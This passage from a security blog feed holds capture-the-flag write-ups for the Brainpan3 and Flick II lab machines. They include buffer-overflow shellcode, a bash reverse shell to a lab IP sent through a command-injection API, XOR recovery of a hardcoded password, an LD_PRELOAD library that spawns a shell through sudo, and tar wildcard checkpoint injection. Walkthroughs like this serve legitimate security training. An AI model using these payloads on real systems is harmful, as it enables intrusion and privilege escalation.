&lt;p&gt;No matter how many times you re-run the binary, the data is always located at &lt;code&gt;0x804a080&lt;/code&gt;.  This means we can place shellcode here and jump to it quite reliably - something which I again tested with SIGTRAPs.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python

import struct

def p(x):
        return struct.pack(&#39;&amp;lt;L&#39;, x)

buf = &amp;quot;AAAA&amp;quot;            # first junk
buf += p(0x804a080)     # eip
buf += &amp;quot;C&amp;quot; * (116-8)    # padding to reach 116
buf += &amp;quot; &amp;quot;
buf += &amp;quot;\xcc&amp;quot; * 100     # key

print buf
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Stopped reason: SIGTRAP
0x0804a081 in ?? ()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now smash some shellcode in.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python

import struct

def p(x):
        return struct.pack(&#39;&amp;lt;L&#39;, x)

buf = &amp;quot;AAAA&amp;quot;           # padding
buf += p(0x804a080)     # key always stored here
buf += &amp;quot;C&amp;quot; * 108        # junk to reach 116
buf += &amp;quot; &amp;quot;
buf += &amp;quot;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&amp;quot;

print buf
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I copied it across to brainpan3 using &lt;code&gt;xxd&lt;/code&gt; and ran it.  It can take a few attempts for it to work.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ ./cryptor $(./cryptor.py)
Segmentation fault (core dumped)
$ ./cryptor $(./cryptor.py)
$ id
uid=1000(anansi) gid=1003(webdav) euid=1002(reynard) groups=1002(reynard)
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>Flick II: The Flickening</title>
      <link>https://rastamouse.me/writeups/2015/flick-ii/</link>
      <pubDate>Tue, 08 Sep 2015 00:00:00 +0000</pubDate>
      
      <guid>https://rastamouse.me/writeups/2015/flick-ii/</guid>
      <description>

&lt;p&gt;After the success of &lt;a href=&#34;https://www.vulnhub.com/entry/flick-1,99/&#34;&gt;Flick: I&lt;/a&gt;, &lt;a href=&#34;https://twitter.com/leonjza&#34;&gt;@leonjza&lt;/a&gt; decided that VulnHub needed a fresh dose of pain and suffering.  &lt;a href=&#34;https://www.vulnhub.com/entry/flick-2,122/&#34;&gt;Flick: II&lt;/a&gt; is a vulnerable machine with a mobile twist - it requires the attacker to wrestle with a custom Android application to breach the VM.  I was more than complimentary about it on &lt;a href=&#34;https://twitter.com/_RastaMouse/status/638789930261585921&#34;&gt;Twitter&lt;/a&gt; - it&amp;rsquo;s definitely worth checking out.&lt;/p&gt;

&lt;h2 id=&#34;https:97d1000c18ea8816fa1721a8cb10b128&#34;&gt;HTTPS&lt;/h2&gt;

&lt;p&gt;After a bit of port scanning we find that only port 443 is open.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# curl -v -k https://192.168.56.102

&amp;gt; GET / HTTP/1.1
&amp;gt; User-Agent: curl/7.38.0
&amp;gt; Host: 192.168.56.102
&amp;gt; Accept: */*
&amp;gt; 
&amp;lt; HTTP/1.1 200 OK
* Server nginx/1.6.3 is not blacklisted
&amp;lt; Server: nginx/1.6.3
&amp;lt; Content-Type: application/json
&amp;lt; Transfer-Encoding: chunked
&amp;lt; Connection: keep-alive
&amp;lt; X-Powered-By: PHP/5.6.10
&amp;lt; Cache-Control: no-cache
&amp;lt; Date: Tue, 08 Sep 2015 17:54:20 GMT
&amp;lt; 
* Connection #0 to host 192.168.56.102 left intact
[&amp;quot;Server Checker&amp;quot;]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;My usual enumeration techniques (nikto, dirbuster etc) didn&amp;rsquo;t turn up anything except a readable &lt;code&gt;.htaccess&lt;/code&gt; file and an ammusing ping/pong.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# curl -k https://192.168.56.102/ping/
{&amp;quot;response&amp;quot;:&amp;quot;pong&amp;quot;}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Time to have a look at the Android application.&lt;/p&gt;

&lt;h2 id=&#34;apk:97d1000c18ea8816fa1721a8cb10b128&#34;&gt;APK&lt;/h2&gt;

&lt;p&gt;I used the Android Studio emulator to run the application.  After creating an AVD in the Studio, I wrote the following &lt;code&gt;BAT&lt;/code&gt; files.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;# This starts the emulator with Nexus AVD
&amp;quot;D:\Program Files\Android\sdk\tools\emulator.exe&amp;quot; -netdelay none -netspeed full -avd Nexus_5_API_23_x86

# This loads the APK into the running emulator (wait for emu to fully start)
&amp;quot;D:\Program Files\Android\sdk\platform-tools\adb.exe&amp;quot; install C:\Users\Rasta\Desktop\flick-check-dist.apk
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Once up and running, the emulator looks a little something like this.  First, enter the IP address of the VM.&lt;/p&gt;

&lt;div align=&#34;center&#34;&gt;
	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
    
        &lt;img src=&#34;https://rastamouse.me/img/writeups/flick-2/1-set-server.jpg&#34;  /&gt;
    
    
&lt;/figure&gt;
&lt;/div&gt;

&lt;p&gt;The application seems to go through some sort of handshake process, then you will be presented with possible commands to run.&lt;/p&gt;

&lt;div align=&#34;center&#34;&gt;
	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
    
        &lt;img src=&#34;https://rastamouse.me/img/writeups/flick-2/2-ps.jpg&#34;  /&gt;
    
    
&lt;/figure&gt;
&lt;/div&gt;

&lt;p&gt;I spent some time trying to proxy the traffic through Burp, in case the application wasn&amp;rsquo;t too fussy about which certificate it would accept.  But ultimately this proved a bit too fiddly to get working and I couldn&amp;rsquo;t force the emulator to honour the system proxy.  This might be an area I could investigate in the near future, but to solve the VM I decided to disassemble the &lt;code&gt;.apk&lt;/code&gt; back into its source code.&lt;/p&gt;

&lt;p&gt;I used an &lt;a href=&#34;http://www.decompileandroid.com/&#34;&gt;online service&lt;/a&gt; for this - upload the &lt;code&gt;apk&lt;/code&gt; and download the disassembled ZIP file.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/flick2/src/com/flick/flickcheck# ls -l
total 296
-rw-r--r-- 1 root root   598 Sep  8 17:20 BuildConfig.java
-rw-r--r-- 1 root root   598 Sep  8 17:20 CallApi$1.java
-rw-r--r-- 1 root root  2698 Sep  8 17:20 CallApi.java
-rw-r--r-- 1 root root   311 Sep  8 17:20 CommandActivity$1.java
-rw-r--r-- 1 root root   612 Sep  8 17:20 CommandActivity$CallAPI$1.java
-rw-r--r-- 1 root root  3480 Sep  8 17:20 CommandActivity$CallAPI.java
-rw-r--r-- 1 root root  9419 Sep  8 17:20 CommandActivity.java
-rw-r--r-- 1 root root  2070 Sep  8 17:20 CommandActivity$SSHCommand.java
-rw-r--r-- 1 root root   631 Sep  8 17:20 DoRegisterActivity$1.java
-rw-r--r-- 1 root root   615 Sep  8 17:20 DoRegisterActivity$CallAPI$1.java
-rw-r--r-- 1 root root  4033 Sep  8 17:20 DoRegisterActivity$CallAPI.java
-rw-r--r-- 1 root root  6369 Sep  8 17:20 DoRegisterActivity.java
-rw-r--r-- 1 root root   308 Sep  8 17:20 MainActivity$1.java
-rw-r--r-- 1 root root   609 Sep  8 17:20 MainActivity$CallAPI$1.java
-rw-r--r-- 1 root root  3391 Sep  8 17:20 MainActivity$CallAPI.java
-rw-r--r-- 1 root root  5146 Sep  8 17:20 MainActivity.java
-rw-r--r-- 1 root root  2901 Sep  8 17:20 PubKeyManager.java
-rw-r--r-- 1 root root   836 Sep  8 17:20 R$anim.java
-rw-r--r-- 1 root root 10526 Sep  8 17:20 R$attr.java
-rw-r--r-- 1 root root   820 Sep  8 17:20 R$bool.java
-rw-r--r-- 1 root root  4597 Sep  8 17:20 R$color.java
-rw-r--r-- 1 root root  4077 Sep  8 17:20 R$dimen.java
-rw-r--r-- 1 root root  4367 Sep  8 17:20 R$drawable.java
-rw-r--r-- 1 root root  2199 Sep  8 17:20 ReadApiServerActivity.java
-rw-r--r-- 1 root root   312 Sep  8 17:20 RegisterActivity$1.java
-rw-r--r-- 1 root root   613 Sep  8 17:20 RegisterActivity$CallAPI$1.java
-rw-r--r-- 1 root root  3750 Sep  8 17:20 RegisterActivity$CallAPI.java
-rw-r--r-- 1 root root  6057 Sep  8 17:20 RegisterActivity.java
-rw-r--r-- 1 root root  4741 Sep  8 17:20 R$id.java
-rw-r--r-- 1 root root   545 Sep  8 17:20 R$integer.java
-rw-r--r-- 1 root root 77594 Sep  8 17:20 R.java
-rw-r--r-- 1 root root  2240 Sep  8 17:20 R$layout.java
-rw-r--r-- 1 root root   623 Sep  8 17:20 R$menu.java
-rw-r--r-- 1 root root   392 Sep  8 17:20 R$mipmap.java
-rw-r--r-- 1 root root  2078 Sep  8 17:20 R$string.java
-rw-r--r-- 1 root root 20104 Sep  8 17:20 R$styleable.java
-rw-r--r-- 1 root root 20526 Sep  8 17:20 R$style.java
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;There is a lot of content to go through, I used &lt;code&gt;grep&lt;/code&gt; to find strings that I thought would be interesting.  Ultimately, I was able to work out how the application worked, which I have summerised in the following diagram.&lt;/p&gt;

&lt;div align=&#34;center&#34;&gt;
	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
    
        &lt;img src=&#34;https://rastamouse.me/img/writeups/flick-2/handshake.png&#34;  /&gt;
    
    
&lt;/figure&gt;
&lt;/div&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;The client submits a POST request to &lt;code&gt;/register/new&lt;/code&gt; with a UUID it wishes to register.  The apk has a rather elaborate method of generating a UUID, but I found you can specify any string.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;The server will respond to the client with an ok message and a &amp;lsquo;token&amp;rsquo;.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# curl -k https://192.168.56.102/register/new -H &#39;Content-Type: application/json&#39; -d &#39;{&amp;quot;uuid&amp;quot;:&amp;quot;rasta&amp;quot;}&#39;
{&amp;quot;registered&amp;quot;:&amp;quot;ok&amp;quot;,&amp;quot;message&amp;quot;:&amp;quot;The requested UUID is now registered.&amp;quot;,&amp;quot;token&amp;quot;:&amp;quot;xgpzOLUyJ45ExFnfalEDESLjgb6drGj3&amp;quot;}
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;The client submits a GET request to &lt;code&gt;/do/cmd/&lt;/code&gt; to specify a command to run (the command must also be &lt;code&gt;base64&lt;/code&gt; encoded).  It must also specify its &lt;code&gt;uuid&lt;/code&gt; and &lt;code&gt;token&lt;/code&gt; in the &lt;code&gt;header&lt;/code&gt;.  Note that the name of the fields also differ slightly.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;The server will respond with the output of the specified command.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# curl -k https://192.168.56.102/do/cmd/$(echo -en &#39;id&#39; | base64) -H &#39;Content-Type: application/json&#39; -H &#39;X-UUID: rasta&#39; -H &#39;X-Token: xgpzOLUyJ45ExFnfalEDESLjgb6drGj3&#39;
{&amp;quot;status&amp;quot;:&amp;quot;ok&amp;quot;,&amp;quot;command&amp;quot;:&amp;quot;id&amp;quot;,&amp;quot;output&amp;quot;:&amp;quot;uid=998(nginx) gid=997(nginx) groups=997(nginx)\n&amp;quot;}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We soon find that there are some blacklisted commands.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# curl -k https://192.168.56.102/do/cmd/$(echo -en &#39;ls&#39; | base64) -H &#39;Content-Type: application/json&#39; -H &#39;X-UUID: rasta&#39; -H &#39;X-Token: xgpzOLUyJ45ExFnfalEDESLjgb6drGj3&#39;
{&amp;quot;status&amp;quot;:&amp;quot;error&amp;quot;,&amp;quot;output&amp;quot;:&amp;quot;Command &#39;ls&#39; contains a banned command.&amp;quot;}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;But it&amp;rsquo;s possible to bypass this by using full paths.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# curl -k https://192.168.56.102/do/cmd/$(echo -en &#39;/bin/ls&#39; | base64) -H &#39;Content-Type: application/json&#39; -H &#39;X-UUID: rasta&#39; -H &#39;X-Token: xgpzOLUyJ45ExFnfalEDESLjgb6drGj3&#39;
{&amp;quot;status&amp;quot;:&amp;quot;ok&amp;quot;,&amp;quot;command&amp;quot;:&amp;quot;\/bin\/ls&amp;quot;,&amp;quot;output&amp;quot;:&amp;quot;index.php\n&amp;quot;}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Time to get that shell - a simple bash reverse shell will do the trick.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# curl -k https://192.168.56.102/do/cmd/$(echo -en &#39;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.56.101/4444 0&amp;gt;&amp;amp;1&#39; | base64) -H &#39;Content-Type: application/json&#39; -H &#39;X-UUID: rasta&#39; -H &#39;X-Token: xgpzOLUyJ45ExFnfalEDESLjgb6drGj3&#39;

root@kali:~# nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.56.101] from (UNKNOWN) [192.168.56.102] 45976
bash: no job control in this shell
bash-4.2$ id
uid=998(nginx) gid=997(nginx) groups=997(nginx)
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;robin:97d1000c18ea8816fa1721a8cb10b128&#34;&gt;Robin&lt;/h2&gt;

&lt;p&gt;The apk has an advertised capability to execute commands over SSH as well as HTTPS.  But since SSH doesn&amp;rsquo;t seem to be enabled on the VM, this doesn&amp;rsquo;t work.  However, there is functional code within the application to establish an SSH connection, but the credentials are rather obscure.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;public CommandActivity()
    {
        integrity_check = &amp;quot;YFhaRBMNFRQDFxJEFlFDExIDVUMGEhcLAUNFBVdWQGFeXBIVWEsZWQ==&amp;quot;;
    }

    private static String validate(String s)
    {
        char ac[] = new char[31];
        char[] _tmp = ac;
        ac[0] = &#39;T&#39;;
        ac[1] = &#39;h&#39;;
        ac[2] = &#39;i&#39;;
        ac[3] = &#39;s&#39;;
        ac[4] = &#39; &#39;;
        ac[5] = &#39;i&#39;;
        ac[6] = &#39;s&#39;;
        ac[7] = &#39; &#39;;
        ac[8] = &#39;a&#39;;
        ac[9] = &#39; &#39;;
        ac[10] = &#39;s&#39;;
        ac[11] = &#39;u&#39;;
        ac[12] = &#39;p&#39;;
        ac[13] = &#39;e&#39;;
        ac[14] = &#39;r&#39;;
        ac[15] = &#39; &#39;;
        ac[16] = &#39;s&#39;;
        ac[17] = &#39;e&#39;;
        ac[18] = &#39;c&#39;;
        ac[19] = &#39;r&#39;;
        ac[20] = &#39;e&#39;;
        ac[21] = &#39;t&#39;;
        ac[22] = &#39; &#39;;
        ac[23] = &#39;m&#39;;
        ac[24] = &#39;e&#39;;
        ac[25] = &#39;s&#39;;
        ac[26] = &#39;s&#39;;
        ac[27] = &#39;a&#39;;
        ac[28] = &#39;g&#39;;
        ac[29] = &#39;e&#39;;
        ac[30] = &#39;!&#39;;
        StringBuilder stringbuilder = new StringBuilder();
        for (int i = 0; i &amp;lt; s.length(); i++)
        {
            stringbuilder.append((char)(s.charAt(i) ^ ac[i % ac.length]));
        }

        return stringbuilder.toString();
    }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The SSH password is the result of &lt;code&gt;YFhaRBMNFRQDFxJEFlFDExIDVUMGEhcLAUNFBVdWQGFeXBIVWEsZWQ==&lt;/code&gt; XOR&amp;rsquo;d with &lt;code&gt;This is a super secret message!&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;The username is specified in friendly plaintext.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;obj = (new JSch()).getSession(&amp;quot;robin&amp;quot;, ((String) (obj)), 22);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Some jiggery-pokery to XOR it back&amp;hellip;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python

import sys

xor1 = &amp;quot;YFhaRBMNFRQDFxJEFlFDExIDVUMGEhcLAUNFBVdWQGFeXBIVWEsZWQ==&amp;quot;.decode(&#39;base64&#39;)
xor2 = &amp;quot;This is a super secret message!&amp;quot;

for r in range(len(xor1)):
        sys.stdout.write(chr(ord(xor1[r]) ^ ord(xor2[r % len(xor2)])))
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# ./xor.py 
40373df4b7a1f413af61cf7fd06d03a565a51898
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Because SSH is disabled, we can&amp;rsquo;t gain access that way.  But since we have a shell, we can &lt;code&gt;su&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;bash-4.2$ su robin
Password: 40373df4b7a1f413af61cf7fd06d03a565a51898

python -c &#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;

[robin@fII ~]$ id     
uid=1000(robin) gid=1000(robin) groups=1000(robin)
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;bryan:97d1000c18ea8816fa1721a8cb10b128&#34;&gt;Bryan&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;[robin@fII ~]$ ls -l
-rw-r--r-- 1 robin robin 1617 Jul 23 21:35 debug.gpg

[robin@fII ~]$ cat debug.gpg
cat debug.gpg
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Dude,

I know you are trying to debug this stupid dice thing, so I figured the below
will be useful?

[...]
__libc_start_main(0x555555554878, 1, 0x7fffffffe508, 0x5555555548e0 &amp;lt;unfinished ...&amp;gt;
getenv(&amp;quot;LD_PRELOAD&amp;quot;)                                                                                          = nil
rand()                                                                                                        = 1804289383
__printf_chk(1, 0x555555554978, 0x6b8b4567, 0x7ffff7dd40d4)                                                   = 22
__cxa_finalize(0x555555754e00, 0, 0, 1)                                                                       = 0x7ffff7dd6290
+++ exited (status 0) +++Dice said: 1804289383
[...]

Lemme know!

- --
Sean
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;[robin@fII ~]$ sudo -l
[sudo] password for robin: 40373df4b7a1f413af61cf7fd06d03a565a51898

Matching Defaults entries for robin on this host:
    requiretty, !visiblepw, always_set_home, env_reset, env_keep=&amp;quot;COLORS
    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS&amp;quot;, env_keep+=&amp;quot;MAIL PS1
    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&amp;quot;, env_keep+=&amp;quot;LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&amp;quot;, env_keep+=&amp;quot;LC_MONETARY
    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&amp;quot;, env_keep+=&amp;quot;LC_TIME LC_ALL
    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&amp;quot;, env_keep+=LD_PRELOAD,
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User robin may run the following commands on this host:
    (bryan) /usr/local/bin/dice
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So we have some debugging information and the ability to run &lt;code&gt;dice&lt;/code&gt; as bryan.  Running the binary outputs a random number (undoubtedly from the rand() function).&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;[robin@fII ~]$ /usr/local/bin/dice
Dice said: 1804289383
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We can also make the following observations:  &lt;code&gt;getenv(&amp;quot;LD_PRELOAD&amp;quot;)&lt;/code&gt; in the trace and &lt;code&gt;env_keep+=LD_PRELOAD&lt;/code&gt; enabled in sudo.  This looks like we could pull off an &lt;code&gt;LD_PRELOAD&lt;/code&gt; trick - by writing our own shared library to replace the rand() call.  Stub out the &lt;code&gt;getenv&lt;/code&gt; function in the binary, then specify our own when running sudo.&lt;/p&gt;

&lt;p&gt;We can test this by forcing dice to return a fixed value, rather than a random one.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;char *getenv(const char *name){
	return 0;
}

int rand(){
	return 4444;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;[robin@fII ~]$ gcc -fPIC -shared rand.c -o /tmp/rand.so

[robin@fII ~]$ sudo -u bryan LD_PRELOAD=/tmp/rand.so /usr/local/bin/dice
[sudo] password for robin: 40373df4b7a1f413af61cf7fd06d03a565a51898

Dice said: 4444
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Replace 4444 with something more useful&amp;hellip;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;int rand(){
        system(&amp;quot;/bin/bash&amp;quot;);
        return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;[robin@fII ~]$ sudo -u bryan LD_PRELOAD=/tmp/rand.so /usr/local/bin/dice
[bryan@fII robin]$ id
uid=1001(bryan) gid=1001(bryan) groups=1001(bryan)
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;sean:97d1000c18ea8816fa1721a8cb10b128&#34;&gt;Sean&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;/usr/local/bin/&lt;/code&gt; actually contains 4 binaries.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;-rwsr-x---. 1 sean bryan    8830 Jul  2 18:56 backup
-rwxr-xr-x. 1 root root  1107672 Jun 22 10:20 composer
-rwx--x--x. 1 root root     8830 Jul  2 17:28 dice
-rwsr-x---  1 root sean   866169 Aug 15 11:53 restore
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;These look like they will serve as our path from robin &amp;gt; sean &amp;gt; root.  &lt;code&gt;backup&lt;/code&gt; is owned by &lt;code&gt;sean&lt;/code&gt; and has &lt;code&gt;suid&lt;/code&gt; set.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;[bryan@fII ~]$ /usr/local/bin/backup
 * Securing environment
 * Performing database backup...
app/
app/.gitignore
database.sqlite
framework/
framework/cache/
framework/cache/.gitignore
framework/sessions/
framework/sessions/.gitignore
framework/views/
framework/views/.gitignore
logs/
logs/.gitignore
logs/lumen.log
 * Backup done!
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I transfered this to my kali box for closer inspection.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# file backup
backup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=47b4cbc324a3676428e493fddbbe5d22d3e2f55d, not stripped

root@kali:~# gdb -q backup
gdb-peda$ checksec 
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : Partial
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ info functions 
All defined functions:

Non-debugging symbols:
0x00000000000006a0  _init
0x00000000000006d0  puts@plt
0x00000000000006e0  setresuid@plt
0x00000000000006f0  setresgid@plt
0x0000000000000700  system@plt
0x0000000000000710  __libc_start_main@plt
0x0000000000000720  __gmon_start__@plt
0x0000000000000730  __cxa_finalize@plt
0x0000000000000740  _start
0x0000000000000770  deregister_tm_clones
0x00000000000007a0  register_tm_clones
0x00000000000007e0  __do_global_dtors_aux
0x0000000000000820  frame_dummy
0x0000000000000858  main
0x00000000000008d0  __libc_csu_init
0x0000000000000940  __libc_csu_fini
0x0000000000000944  _fini
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ pdisass main
Dump of assembler code for function main:
   0x0000000000000858 &amp;lt;+0&amp;gt;:	sub    rsp,0x8
   0x000000000000085c &amp;lt;+4&amp;gt;:	mov    edx,0x3ea
   0x0000000000000861 &amp;lt;+9&amp;gt;:	mov    esi,0x3ea
   0x0000000000000866 &amp;lt;+14&amp;gt;:	mov    edi,0x3ea
   0x000000000000086b &amp;lt;+19&amp;gt;:	mov    eax,0x0
   0x0000000000000870 &amp;lt;+24&amp;gt;:	call   0x6e0 &amp;lt;setresuid@plt&amp;gt;
   0x0000000000000875 &amp;lt;+29&amp;gt;:	mov    edx,0x3ea
   0x000000000000087a &amp;lt;+34&amp;gt;:	mov    esi,0x3ea
   0x000000000000087f &amp;lt;+39&amp;gt;:	mov    edi,0x3ea
   0x0000000000000884 &amp;lt;+44&amp;gt;:	mov    eax,0x0
   0x0000000000000889 &amp;lt;+49&amp;gt;:	call   0x6f0 &amp;lt;setresgid@plt&amp;gt;
   0x000000000000088e &amp;lt;+54&amp;gt;:	lea    rdi,[rip+0xbf]        # 0x954
   0x0000000000000895 &amp;lt;+61&amp;gt;:	call   0x6d0 &amp;lt;puts@plt&amp;gt;
   0x000000000000089a &amp;lt;+66&amp;gt;:	lea    rdi,[rip+0xdf]        # 0x980
   0x00000000000008a1 &amp;lt;+73&amp;gt;:	call   0x6d0 &amp;lt;puts@plt&amp;gt;
   0x00000000000008a6 &amp;lt;+78&amp;gt;:	lea    rdi,[rip+0xfb]        # 0x9a8
   0x00000000000008ad &amp;lt;+85&amp;gt;:	mov    eax,0x0
   0x00000000000008b2 &amp;lt;+90&amp;gt;:	call   0x700 &amp;lt;system@plt&amp;gt;
   0x00000000000008b7 &amp;lt;+95&amp;gt;:	lea    rdi,[rip+0xae]        # 0x96c
   0x00000000000008be &amp;lt;+102&amp;gt;:	call   0x6d0 &amp;lt;puts@plt&amp;gt;
   0x00000000000008c3 &amp;lt;+107&amp;gt;:	add    rsp,0x8
   0x00000000000008c7 &amp;lt;+111&amp;gt;:	ret  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Some interesting functions - a &lt;code&gt;setresuid&lt;/code&gt;, &lt;code&gt;setresgid&lt;/code&gt; and &lt;code&gt;system&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;setresuid (ruid=0x3ea, euid=0x3ea, suid=0x3ea)
setresgid (rgid=0x3ea, egid=0x3ea, sgid=0x3ea)
system (line=0x7f8d5f3309a8 &amp;quot;PATH=/usr/local/bin:/bin:/usr/bin:/usr/local/sbin:/usr/sbin; cd /usr/share/nginx/serverchecker/storage; /bin/tar -zvcf /home/sean/backup_$(/bin/date +\&amp;quot;%Y%m%d\&amp;quot;).tar.gz *;&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The tell-tale woot woot in this, is the command being passed into system.  There is a wildcard: &lt;code&gt;.tar.gz *&lt;/code&gt; which is vulnerable to a &lt;a href=&#34;https://www.exploit-db.com/papers/33930/&#34;&gt;pretty well documented&lt;/a&gt; Tar arbitrary command execution.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;[bryan@fII bin]$ cd /usr/share/nginx/serverchecker/storage
[bryan@fII storage]$ &amp;gt;&#39;--checkpoint=1&#39;
[bryan@fII storage]$ &amp;gt;&#39;--checkpoint-action=exec=sh shell.sh&#39;
[bryan@fII storage]$ echo &#39;/bin/bash&#39; &amp;gt; shell.sh

[bryan@fII storage]$ ls -l

drwxr-xr-x. 2 nginx nginx   23 Jun 22 10:43 app
-rw-rw-r--  1 bryan bryan    0 Sep  8 22:13 --checkpoint=1
-rw-rw-r--  1 bryan bryan    0 Sep  8 22:13 --checkpoint-action=exec=sh shell.sh
-rwxrwxrwx. 1 nginx nginx 6144 Sep  8 20:35 database.sqlite
drwxr-xr-x. 5 nginx nginx   45 Jun 22 10:43 framework
drwxr-xr-x. 2 nginx nginx   39 Jun 22 17:16 logs
-rw-rw-r--  1 bryan bryan   10 Sep  8 22:14 shell.sh

[bryan@fII storage]$ /usr/local/bin/backup
/usr/local/bin/backup
 * Securing environment
 * Performing database backup...
app/
app/.gitignore
database.sqlite
framework/
framework/cache/
framework/cache/.gitignore
sh-4.2$ id; whoami
uid=1002(sean) gid=1001(bryan) groups=1002(sean),1001(bryan)
sean
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;root:97d1000c18ea8816fa1721a8cb10b128&#34;&gt;Root&lt;/h2&gt;

&lt;p&gt;Up next is &lt;code&gt;-rwsr-x---  1 root sean   866169 Aug 15 11:53 restore&lt;/code&gt;.  Trying to run it as we are results in a fail.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;sh-4.2$ ./restore
sh: ./restore: Permission denied
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We have to set our group properly with &lt;code&gt;newgrp sean&lt;/code&gt;.&lt;/p&gt;

